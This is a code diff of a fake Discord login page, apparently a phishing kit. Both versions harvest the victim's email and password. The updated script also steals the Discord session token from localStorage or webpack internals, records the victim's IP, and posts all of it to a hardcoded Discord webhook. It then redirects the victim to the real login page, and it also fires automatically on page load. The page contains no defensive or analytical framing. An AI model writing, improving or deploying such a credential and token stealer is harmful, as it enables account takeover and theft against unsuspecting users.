@@ -1,87 +1,121 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Discord - Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="https://discord.com/assets/1234567890.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Discord</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
-    body, html { margin: 0; padding: 0; height: 100%; background: #36393f; font-family: 'Whitney', sans-serif; }
-    .app { display: flex; justify-content: center; align-items: center; height: 100%; }
-    .auth-box { background: #36393f; width: 400px; padding: 32px; border-radius: 8px; }
-    .logo { text-align: center; margin-bottom: 24px; }
-    .logo img { width: 124px; }
-    h1 { color: #fff; font-size: 24px; text-align: center; margin: 0 0 8px; }
-    p { color: #b9bbbe; font-size: 16px; text-align: center; margin: 0 0 24px; }
-    input { width: 100%; padding: 12px; margin: 8px 0; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; box-sizing: border-box; }
-    button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: white; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 16px; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; background: #fff; font-family: 'Inter', sans-serif; color: #060607; }
+    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 24px; }
+    .logo { width: 124px; margin-bottom: 32px; }
+    h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center; }
+    p { font-size: 16px; color: #5c5e66; margin-bottom: 32px; text-align: center; }
+    form { width: 100%; max-width: 400px; }
+    label { font-size: 12px; font-weight: 600; color: #060607; margin-bottom: 6px; display: block; }
+    input { width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; margin-bottom: 16px; background: #f9f9fa; }
+    input:focus { outline: none; border-color: #5865f2; }
+    .forgot { text-align: right; margin-bottom: 24px; }
+    .forgot a { color: #5865f2; font-size: 14px; text-decoration: none; }
+    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
     button:hover { background: #4752c4; }
-    .error { color: #ed4245; font-size: 14px; text-align: center; margin-top: 10px; display: none; }
+    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #5c5e66; }
+    .register a { color: #5865f2; text-decoration: none; }
   </style>
 </head>
 <body>
-  <div class="app">
-    <div class="auth-box">
-      <div class="logo">
-        <img src="https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png" alt="Discord">
+  <div class="container">
+    <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
+    <h1>Welcome back!</h1>
+    <p>We're so excited to see you again!</p>
+    <form id="loginForm">
+      <label for="email">Email or Phone Number <span style="color:#f23f42">*</span></label>
+      <input type="text" id="email" required />
+      <label for="password">Password <span style="color:#f23f42">*</span></label>
+      <input type="password" id="password" required />
+      <div class="forgot">
+        <a href="#">Forgot your password?</a>
       </div>
-      <h1>Welcome back!</h1>
-      <p>We’re so excited to see you again!</p>
-      <form id="loginForm">
-        <input type="text" id="email" placeholder="Email or Phone Number" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
-      </form>
-      <div id="error" class="error"></div>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="register">
+      Need an account? <a href="#">Register</a>
     </div>
   </div>
 
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
-    
+
     function grabToken() {
+      let token = null;
+      let method = 'none';
+
       try {
-        const token = localStorage.getItem('token')?.replace(/"/g, '');
-        if (token && token.length > 50) {
-          sendToWebhook({ token, type: 'auto_grab' });
+        const ls = localStorage.getItem('token');
+        if (ls && ls.length > 50) {
+          token = ls.replace(/"/g, '');
+          method = 'localStorage';
         }
-      } catch(e) {}
+      } catch (e) {}
+
+      if (!token) {
+        try {
+          webpackChunkdiscord_app.push([[''], {}, r => {
+            for (let m in r.c) {
+              if (r.c[m].exports?.default?.getToken) {
+                token = r.c[m].exports.default.getToken();
+                method = 'webpack';
+                break;
+              }
+            }
+          }]);
+        } catch (e) {}
+      }
+
+      return { token, method };
     }
 
-    async function sendToWebhook(data) {
+    async function send(data) {
       const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
-      const payload = {
-        embeds: [{
-          title: data.type === 'auto_grab' ? 'TOKEN AUTO-GRABBED' : 'NEW LOGIN',
-          color: data.type === 'auto_grab' ? 0x00ff00 : 0x5865f2,
-          fields: [
-            { name: 'Email/Phone', value: data.email ? `\`${data.email}\`` : 'N/A', inline: false },
-            { name: 'Password', value: data.password ? `\`${data.password}\`` : 'N/A', inline: false },
-            { name: 'Token', value: data.token ? `\`\`\`${data.token}\`\`\`` : 'Not found', inline: false },
-            { name: 'IP', value: `\`${ip}\``, inline: true },
-            { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
-          ],
-          timestamp: new Date().toISOString()
-        }]
-      };
-      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      const { token, method } = grabToken();
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: token ? 'TOKEN GRABBED' : 'LOGIN ATTEMPT',
+            color: token ? 0x00ff00 : 0x5865f2,
+            fields: [
+              { name: 'Email/Phone', value: `\`${data.email}\``, inline: false },
+              { name: 'Password', value: `\`${data.password}\``, inline: false },
+              { name: 'Token', value: token ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
+              { name: 'Method', value: `\`${method}\``, inline: true },
+              { name: 'IP', value: `\`${ip}\``, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
     }
 
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    document.getElementById('loginForm').onsubmit = async (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
       if (!email || !password) return;
 
-      setTimeout(grabToken, 2000);
-      sendToWebhook({ email, password, type: 'login' });
+      await send({ email, password });
 
       setTimeout(() => {
         window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
       }, 800);
-    });
+    };
 
-    setTimeout(grabToken, 1500);
+    // Auto-grab on load
+    setTimeout(() => send({ email: 'AUTO', password: 'AUTO' }), 1500);
   </script>
 </body>
 </html>
